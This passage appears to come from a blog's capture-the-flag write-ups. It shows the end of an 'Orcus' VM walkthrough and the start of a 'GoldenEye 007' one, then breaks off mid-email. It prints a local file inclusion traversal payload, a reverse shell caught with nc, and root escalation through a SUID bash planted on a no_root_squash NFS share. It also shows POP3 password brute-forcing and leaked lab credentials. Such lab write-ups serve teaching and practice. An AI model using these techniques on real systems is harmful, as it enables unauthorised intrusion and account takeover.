</span><span class='line'>#!@!  !!!  !!@!@!    !!!       !@!  !!!   !!@!!!
</span><span class='line'>#!!:  !!!  !!: :!!   :!!       !!:  !!!       !:!
</span><span class='line'>#:!:  !:!  :!:  !:!  :!:       :!:  !:!      !:!
</span><span class='line'>#::::: ::  ::   :::   ::: :::  ::::: ::  :::: ::
</span><span class='line'># : :  :    :   : :   :: :: :   : :  :   :: : :
</span><span class='line'>Disallow: /exponent.js.php
</span><span class='line'>Disallow: /exponent.js2.php
</span><span class='line'>Disallow: /exponent.php
</span><span class='line'>Disallow: /exponent_bootstrap.php
</span><span class='line'>Disallow: /exponent_constants.php
</span><span class='line'>Disallow: /exponent_php_setup.php
</span><span class='line'>Disallow: /exponent_version.php
</span><span class='line'>Disallow: /getswversion.php
</span><span class='line'>Disallow: /login.php
</span><span class='line'>Disallow: /overrides.php
</span><span class='line'>Disallow: /popup.php
</span><span class='line'>Disallow: /selector.php
</span><span class='line'>Disallow: /site_rss.php
</span><span class='line'>Disallow: /source_selector.php
</span><span class='line'>Disallow: /thumb.php
</span><span class='line'>Disallow: /ABOUT.md
</span><span class='line'>Disallow: /CHANGELOG.md
</span><span class='line'>Disallow: /CREDITS.md
</span><span class='line'>Disallow: /INSTALLATION.md
</span><span class='line'>Disallow: /LICENSE
</span><span class='line'>Disallow: /README.md
</span><span class='line'>Disallow: /RELEASE.md
</span><span class='line'>Disallow: /TODO.md
</span><span class='line'>Disallow: /cgi-bin/
</span><span class='line'>Disallow: /cart/
</span><span class='line'>Disallow: /login/
</span><span class='line'>Disallow: /users/
</span><span class='line'>Disallow: /files/
</span><span class='line'>Disallow: /tmp/
</span><span class='line'>Disallow: /search/
</span><span class='line'>
</span><span class='line'># Sitemap: http://www.mysite.com/sitemap.xml</span></code></pre></td></tr></table></div></figure>


<p>I looked around and the files point to a Exponent Content Management System installation. Trying the login and other pages gives a message that the site is down for maintenance and database is offline. But another potentially interesting find was <a href="http://192.168.159.131/tmp/views_c/_0c7aa37c1e5b7386c5d18dba80bb5d3b%5e118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php">http://192.168.159.131/tmp/views_c/_0c7aa37c1e5b7386c5d18dba80bb5d3b%5e118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php</a> which gives the message &ldquo;no direct access allowed&rdquo;.</p>

<p>I looked for exploits for this CMS, but the interesting ones were from older versions. According to the RELEASE.md file, the version here is 2.3.8. I also found that this version should be vulnerable to CVE-2016-7095, but couldn&rsquo;t find a way to exploit it. Since the VM description emphasized enumeration, I fired up gobuster to see if there&rsquo;s more I might have missed on the web server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gobuster -u http://192.168.159.131/ -w /usr/share/wordlists/dirb/big.txt
</span><span class='line'>/.htpasswd (Status: 403)
</span><span class='line'>/.htaccess (Status: 403)
</span><span class='line'>/FCKeditor (Status: 301)
</span><span class='line'>/LICENSE (Status: 200)
</span><span class='line'>/admin (Status: 301)
</span><span class='line'>/backups (Status: 301)
</span><span class='line'>/cron (Status: 301)
</span><span class='line'>/external (Status: 301)
</span><span class='line'>/files (Status: 301)
</span><span class='line'>/framework (Status: 301)
</span><span class='line'>/install (Status: 301)
</span><span class='line'>/javascript (Status: 301)
</span><span class='line'>/phpmyadmin (Status: 301)
</span><span class='line'>/robots.txt (Status: 200)
</span><span class='line'>/server-status (Status: 403)
</span><span class='line'>/themes (Status: 301)
</span><span class='line'>/tmp (Status: 301)
</span><span class='line'>/webalizer (Status: 200)
</span><span class='line'>/zenphoto (Status: 301)</span></code></pre></td></tr></table></div></figure>


<p>This is interesting. The first thing I checked was the backups folder.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[PARENTDIR]  Parent Directory        -
</span><span class='line'>[ ]   SimplePHPQuiz-Backupz.tar.gz    2016-10-31 20:29    210K
</span><span class='line'>[ ]   ssh-creds.bak   2016-11-01 21:33    12</span></code></pre></td></tr></table></div></figure>


<p>Got a Forbidden error when trying to access the ssh creds file, but I was able to download the SimplePHPQuiz one. It contained the files for another application that doesn&rsquo;t seem to be installed. I did a search for passwords and got a hit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -l -r password *
</span><span class='line'>css/bootstrap.css.map
</span><span class='line'>includes/db_conn.php</span></code></pre></td></tr></table></div></figure>


<p>Inside db_conn.php I found some database credentials:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">//Set the database access information as constants</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;dbuser&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;dbpassword&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;quizdb&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Moving on. The /cron folder contains a bunch of PHP files that I couldn&rsquo;t get anything interesting from. The /framework folder was another dead end. But when I went to /zenphoto, I saw that the Zenphoto 1.4.10 installation needed a last step of providing database credentials. It was configured with root@localhost and it got an access denied. In searchsploit I saw a local file inclusion exploit for this version of Zenphoto, so I tried to complete the installation with the previously discovered credentials. It worked and I was then prompted to create an admin user, which I did:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/orcus/admin.png" title="zenphoto admin" alt="zenphoto admin"></p>

<p>Next I looked at the LFI exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">Exploit</span><span class="o">:</span> <span class="nx">ZenPhoto</span> <span class="mf">1.4</span><span class="o">.</span><span class="mi">10</span> <span class="o">-</span> <span class="nx">Local</span> <span class="nx">File</span> <span class="nx">Inclusion</span>
</span><span class='line'>      <span class="nx">URL</span><span class="o">:</span> <span class="nx">https</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">exploit</span><span class="o">-</span><span class="nx">db</span><span class="o">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">exploits</span><span class="o">/</span><span class="mi">38841</span><span class="o">/</span>
</span><span class='line'>     <span class="nx">Path</span><span class="o">:</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">exploitdb</span><span class="o">/</span><span class="nx">exploits</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="nx">webapps</span><span class="o">/</span><span class="mf">38841.</span><span class="nx">txt</span>
</span><span class='line'>
</span><span class='line'><span class="nx">Vulnerability</span> <span class="nx">Details</span><span class="o">:</span>
</span><span class='line'><span class="o">======================</span>
</span><span class='line'><span class="nx">Zen</span> <span class="nx">Photos</span> <span class="nx">pluginDoc</span><span class="o">.</span><span class="nx">php</span> <span class="nx">PHP</span> <span class="nb">file</span> <span class="nx">is</span> <span class="nx">vulnerable</span> <span class="nx">to</span> <span class="nx">local</span> <span class="nb">file</span> <span class="nx">inclusion</span>
</span><span class='line'><span class="nx">that</span> <span class="nx">allows</span> <span class="nx">attackers</span>
</span><span class='line'><span class="nx">to</span> <span class="nx">read</span> <span class="nx">arbitrary</span> <span class="nx">server</span> <span class="nx">files</span> <span class="nx">outside</span> <span class="nx">of</span> <span class="nx">the</span> <span class="nb">current</span> <span class="nx">web</span> <span class="nx">directory</span> <span class="nx">by</span>
</span><span class='line'><span class="nx">injecting</span> <span class="s2">&quot;../&quot;</span> <span class="nx">directory</span> <span class="nx">traversal</span>
</span><span class='line'><span class="nx">characters</span><span class="p">,</span> <span class="nx">which</span> <span class="nx">can</span> <span class="nx">lead</span> <span class="nx">to</span> <span class="nx">sensitive</span> <span class="nx">information</span> <span class="nx">disclosure</span><span class="p">,</span> <span class="nx">code</span>
</span><span class='line'><span class="nx">execution</span> <span class="k">or</span> <span class="nx">DOS</span> <span class="nx">on</span> <span class="nx">the</span> <span class="nx">victims</span> <span class="nx">web</span> <span class="nx">server</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nx">Local</span> <span class="nx">File</span> <span class="nx">Inclusion</span> <span class="nx">Codes</span><span class="o">:</span>
</span><span class='line'><span class="o">==========================</span>
</span><span class='line'><span class="nx">http</span><span class="o">://</span><span class="nx">localhost</span><span class="o">/</span><span class="nx">zenphoto</span><span class="o">-</span><span class="nx">zenphoto</span><span class="o">-</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">10</span><span class="o">/</span><span class="nx">zp</span><span class="o">-</span><span class="nx">core</span><span class="o">/</span><span class="nx">pluginDoc</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">thirdparty</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">extension</span><span class="o">=../../../</span><span class="nx">xampp</span>
</span><span class='line'><span class="o">/</span><span class="nb">phpinfo</span>
</span></code></pre></td></tr></table></div></figure>


<p>The path didn&rsquo;t work for me. I kept looking around while logged in as admin and noticed a file upload plugin:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/orcus/plugins.png" title="zenphoto upload" alt="zenphoto upload"></p>

<p>I enabled the elFinder plugin and now I could upload arbitrary files:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/orcus/upload.png" title="zenphoto shell" alt="zenphoto shell"></p>

<h2>Flag #1 &ndash; Standard shell</h2>

<p>With the PHP reverse shell uploaded, all I had to do was to go to it in the /uploaded directory and I got a shell and the first flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">nc</span> <span class="o">-</span><span class="nx">vnlp</span> <span class="mi">9000</span>
</span><span class='line'><span class="nx">listening</span> <span class="nx">on</span> <span class="p">[</span><span class="nx">any</span><span class="p">]</span> <span class="mi">9000</span> <span class="o">...</span>
</span><span class='line'><span class="nx">connect</span> <span class="nx">to</span> <span class="p">[</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">159.129</span><span class="p">]</span> <span class="nx">from</span> <span class="p">(</span><span class="nx">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">159.131</span><span class="p">]</span> <span class="mi">38806</span>
</span><span class='line'><span class="nx">Linux</span> <span class="nx">Orcus</span> <span class="mf">4.4</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">45</span><span class="o">-</span><span class="nx">generic</span> <span class="c1">#66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> <span class="mi">12</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">20</span> <span class="nx">up</span> <span class="mi">25</span> <span class="nx">min</span><span class="p">,</span>  <span class="mi">0</span> <span class="nx">users</span><span class="p">,</span>  <span class="nx">load</span> <span class="nx">average</span><span class="o">:</span> <span class="mf">0.07</span><span class="p">,</span> <span class="mf">0.02</span><span class="p">,</span> <span class="mf">0.00</span>
</span><span class='line'><span class="nx">USER</span>     <span class="nx">TTY</span>      <span class="nx">FROM</span>             <span class="nx">LOGIN</span><span class="o">@</span>   <span class="nx">IDLE</span>   <span class="nx">JCPU</span>   <span class="nx">PCPU</span> <span class="nx">WHAT</span>
</span><span class='line'><span class="nx">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="p">)</span> <span class="nx">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="p">)</span>
</span><span class='line'><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">sh</span><span class="o">:</span> <span class="mi">0</span><span class="o">:</span> <span class="nx">can</span><span class="err">&#39;</span><span class="nx">t</span> <span class="nx">access</span> <span class="nx">tty</span><span class="p">;</span> <span class="nx">job</span> <span class="nx">control</span> <span class="nx">turned</span> <span class="nx">off</span>
</span><span class='line'><span class="err">$</span> <span class="nx">ls</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span>
</span><span class='line'><span class="mi">9</span><span class="nx">bd556e5c961356857d6d527a7973560</span><span class="o">-</span><span class="nx">zen</span><span class="o">-</span><span class="nx">cart</span><span class="o">-</span><span class="nx">v1</span><span class="o">.</span><span class="mf">5.4</span><span class="o">-</span><span class="mf">12302014.</span><span class="nx">zip</span>
</span><span class='line'><span class="nx">a0c4f0d176f87ceda9b9890af09ed644</span><span class="o">-</span><span class="nx">Adem</span><span class="o">-</span><span class="nx">master</span><span class="o">.</span><span class="nx">zip</span>
</span><span class='line'><span class="nx">b873fef091715964d207daa19d320a99</span><span class="o">-</span><span class="nx">zenphoto</span><span class="o">-</span><span class="nx">zenphoto</span><span class="o">-</span><span class="mf">1.4</span><span class="o">.</span><span class="mf">10.</span><span class="nx">tar</span><span class="o">.</span><span class="nx">gz</span>
</span><span class='line'><span class="nx">flag</span><span class="o">.</span><span class="nx">txt</span>
</span><span class='line'><span class="nx">html</span>
</span><span class='line'><span class="nx">zenphoto</span><span class="o">-</span><span class="nx">zenphoto</span><span class="o">-</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">10</span>
</span><span class='line'><span class="err">$</span> <span class="nx">cat</span> <span class="nx">flag</span><span class="o">.</span><span class="nx">txt</span>
</span><span class='line'><span class="mi">868</span><span class="nx">c889965b7ada547fae81f922e45c4</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Flag #2 &ndash; Getting root</h2>

<p>Remembering the NFS share that didn&rsquo;t get us anywhere earlier, I checked the <strong>/etc/exports</strong> file and found something really interesting and good for us:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">/</span><span class="nx">tmp</span> <span class="o">*</span><span class="p">(</span><span class="nx">rw</span><span class="p">,</span><span class="nx">no_root_squash</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Not only we had write permissions on the share, which I haven&rsquo;t tried, but no root squash means that our root user can leave a SUID shell owned by root on the share for our www-data user after we copy it there with our low-privilege shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="err">$</span> <span class="nx">cp</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span> <span class="nx">root</span>
</span><span class='line'><span class="err">$</span> <span class="nx">ls</span> <span class="o">-</span><span class="nx">l</span> <span class="nx">root</span>
</span><span class='line'><span class="o">-</span><span class="nx">rwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">1</span> <span class="nx">www</span><span class="o">-</span><span class="nx">data</span> <span class="nx">www</span><span class="o">-</span><span class="nx">data</span> <span class="mi">1109564</span> <span class="nx">Apr</span>  <span class="mi">5</span> <span class="mi">12</span><span class="o">:</span><span class="mi">13</span> <span class="nx">root</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now chown to root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">deck</span><span class="o">:/</span><span class="nx">mnt</span><span class="c1"># chown root:root root</span>
</span><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">deck</span><span class="o">:/</span><span class="nx">mnt</span><span class="c1"># chmod +s root</span>
</span><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">deck</span><span class="o">:/</span><span class="nx">mnt</span><span class="c1"># ls -l root</span>
</span><span class='line'><span class="o">-</span><span class="nx">rwsr</span><span class="o">-</span><span class="nx">sr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">1109564</span> <span class="nx">Apr</span>  <span class="mi">5</span>  <span class="mi">2019</span> <span class="nx">root</span>
</span></code></pre></td></tr></table></div></figure>


<p>Execute the binary and you have root on the box and the 2nd flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">whoami</span>
</span><span class='line'><span class="nx">root</span>
</span><span class='line'><span class="nx">ls</span> <span class="o">/</span><span class="nx">root</span>
</span><span class='line'><span class="nx">flag</span><span class="o">.</span><span class="nx">txt</span>
</span><span class='line'><span class="nx">cat</span> <span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">flag</span><span class="o">.</span><span class="nx">txt</span>
</span><span class='line'><span class="mi">807307</span><span class="nx">b49314f822985d0410de7d8bfe</span>
</span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t poke around for more flags, so this is for this box!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'> <span class="nx">________________________________</span>
</span><span class='line'><span class="o">/</span> <span class="nx">All</span> <span class="nx">generalizations</span> <span class="nx">are</span> <span class="k">false</span><span class="p">,</span> <span class="nx">\</span>
</span><span class='line'><span class="o">|</span> <span class="nx">including</span> <span class="k">this</span> <span class="nx">one</span><span class="o">.</span>            <span class="o">|</span>
</span><span class='line'><span class="o">|</span>                                <span class="o">|</span>
</span><span class='line'><span class="nx">\</span> <span class="o">--</span> <span class="nx">Mark</span> <span class="nx">Twain</span>                  <span class="o">/</span>
</span><span class='line'> <span class="o">--------------------------------</span>
</span><span class='line'>        <span class="nx">\</span>   <span class="o">^</span><span class="nx">__</span><span class="o">^</span>
</span><span class='line'>         <span class="nx">\</span>  <span class="p">(</span><span class="nx">oo</span><span class="p">)</span><span class="nx">\_______</span>
</span><span class='line'>            <span class="p">(</span><span class="nx">__</span><span class="p">)</span><span class="nx">\</span>       <span class="p">)</span><span class="nx">\</span><span class="o">/</span><span class="nx">\</span>
</span><span class='line'>                <span class="o">||----</span><span class="nx">w</span> <span class="o">|</span>
</span><span class='line'>                <span class="o">||</span>     <span class="o">||</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GoldenEye 007]]></title>
    <link href="http://chousensha.github.io/blog/2019/04/02/goldeneye-007/"/>
    <updated>2019-04-02T21:57:39+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/04/02/goldeneye-007</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired by a James Bond movie:</p>

<blockquote><p>I recently got done creating an OSCP type vulnerable machine that&rsquo;s themed after the great James Bond film (and even better n64 game) GoldenEye.
The goal is to get root and capture the secret GoldenEye codes &ndash; flag.txt.</p>

<p>I&rsquo;d rate it as Intermediate, it has a good variety of techniques needed to get root &ndash; no exploit development/buffer overflows. After completing
the OSCP I think this would be a great one to practice on, plus there&rsquo;s a hint of CTF flavor.</p></blockquote>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>25/tcp    open  smtp        Postfix smtpd
</span><span class='line'>|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: GoldenEye Primary Admin Server
</span><span class='line'>55006/tcp open  ssl/unknown
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>55007/tcp open  pop3        Dovecot pop3d
</span><span class='line'>|_pop3-capabilities: SASL(PLAIN) USER AUTH-RESP-CODE CAPA STLS UIDL PIPELINING RESP-CODES TOP
</span><span class='line'>|_ssl-date: TLS randomness does not represent time</span></code></pre></td></tr></table></div></figure>


<p>Navigating to the web server takes you to this screen:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/goldeneye/web.png" title="goldeneye web" alt="goldeneye web"></p>

<p>In the source code of the page there&rsquo;s a linked <em>terminal.js</em> file. Viewing that reveals some interesting comments:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>//
</span><span class='line'>//Boris, make sure you update your default password.
</span><span class='line'>//My sources say MI6 maybe planning to infiltrate.
</span><span class='line'>//Be on the lookout for any suspicious network traffic....
</span><span class='line'>//
</span><span class='line'>//I encoded you p@ssword below...
</span><span class='line'>//
</span><span class='line'>//<span class="ni">&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span>
</span><span class='line'>//
</span><span class='line'>//BTW Natalya says she can break your codes
</span><span class='line'>//
</span></code></pre></td></tr></table></div></figure>


<p>So we have a HTML encoded password which decodes to <code>InvincibleHack3r</code>. Now we can go to <em>/sev-home</em> and log in as boris with this password.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/goldeneye/goldeneye.png" title="goldeneye login" alt="goldeneye login"></p>

<p>We can now make use of that POP3 service on port 55007. Boris&#8217; credentials didn&rsquo;t work though. I used Nikto to further look at the web server and got an interesting hit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
</span></code></pre></td></tr></table></div></figure>


<p>Going to that page wasn&rsquo;t immediately useful though, but maybe some of the information could be used further:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/goldeneye/splashadmin.png" title="splashadmin" alt="splashadmin"></p>

<p>With nothing else to go from, I attempted to bruteforce the mail login credentials for boris with the Metasploit <em>scanner/pop3/pop3_login</em> module and the <em>fasttrack.txt</em> wordlist:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>[+] 192.168.159.130:55007 - 192.168.159.130:55007 - Success: &#39;boris:secret1!&#39; &#39;+OK Logged in.  &#39;
</span></code></pre></td></tr></table></div></figure>


<p>So now we have credentials for Boris&#8217; mail and I was able to read his mails:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>nc 192.168.159.130 55007
</span><span class='line'>+OK GoldenEye POP3 Electronic-Mail System
</span><span class='line'>USER boris
</span><span class='line'>+OK
</span><span class='line'>PASS secret1!
</span><span class='line'>+OK Logged in.
</span><span class='line'>LIST
</span><span class='line'>+OK 3 messages:
</span><span class='line'>1 544
</span><span class='line'>2 373
</span><span class='line'>3 921
</span><span class='line'>.
</span><span class='line'>RETR 1
</span><span class='line'>+OK 544 octets
</span><span class='line'>Return-Path: <span class="nt">&lt;root</span><span class="err">@</span><span class="na">127</span><span class="err">.</span><span class="na">0</span><span class="err">.</span><span class="na">0</span><span class="err">.</span><span class="na">1</span><span class="err">.</span><span class="na">goldeneye</span><span class="nt">&gt;</span>
</span><span class='line'>X-Original-To: boris
</span><span class='line'>Delivered-To: boris@ubuntu
</span><span class='line'>Received: from ok (localhost [127.0.0.1])
</span><span class='line'>  by ubuntu (Postfix) with SMTP id D9E47454B1
</span><span class='line'>  for <span class="nt">&lt;boris&gt;</span>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
